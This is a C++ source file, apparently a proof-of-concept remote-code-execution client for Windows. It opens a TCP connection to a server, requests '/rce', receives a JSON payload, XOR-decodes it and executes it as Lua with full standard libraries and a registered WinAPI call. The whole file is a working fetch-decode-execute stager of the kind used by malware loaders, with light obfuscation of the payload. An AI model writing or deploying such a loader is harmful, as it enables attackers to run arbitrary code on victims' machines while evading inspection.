#include <iostream>
#include <WS2tcpip.h>
#include <lua.hpp>
#include <json.hpp>
#include <Windows.h>
#pragma comment (lib, "ws2_32.lib")

using json = nlohmann::json;

int SCTA(lua_State* L) {
    int attr = (int)luaL_checkinteger(L, 1);
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), attr);
    
    return 0;
}

std::string xor_decrypt(const std::string& data) {
    std::string result = data;
    for (size_t i = 0; i < data.size(); ++i) {
        result[i] ^= 0x5A;
    }
    return result;
}

int main() {
	printf("[*] Client Started.\n");

    // Open connection
	WSADATA data;
    WSAStartup(MAKEWORD(2, 2), &data);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); // SOCK_STREAM -> TCP 
    sockaddr_in server = { AF_INET, htons(30000) }; // Server Port
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr); // Server IP

    // Connect to server
    connect(sock, (sockaddr*)&server, sizeof(server));

    // send get request
    const char* request = "GET /rce";
    send(sock, request, strlen(request), 0);

    char buf[4096] = {};
    int bytes = recv(sock, buf, sizeof(buf) - 1, 0);
    if (bytes <= 0) {
        std::cerr << "[-] Failed to receive payload.\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    buf[bytes] = '\0';
    lua_State* L = luaL_newstate();
    luaL_openlibs(L);

    // can register winapi calls like
    lua_register(L, "SetConsoleTextAttribute", SCTA);
    lua_pushinteger(L, FOREGROUND_BLUE);
    lua_setglobal(L, "FOREGROUND_BLUE");
    lua_pushinteger(L, FOREGROUND_INTENSITY);
    lua_setglobal(L, "FOREGROUND_INTENSITY");

    auto res = json::parse(buf);
    std::string encryptedPayload = res["payload"];
    std::string luaPayload = xor_decrypt(encryptedPayload);

    luaL_dostring(L, luaPayload.c_str());
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);

    // Close 
    closesocket(sock);
    WSACleanup();
}
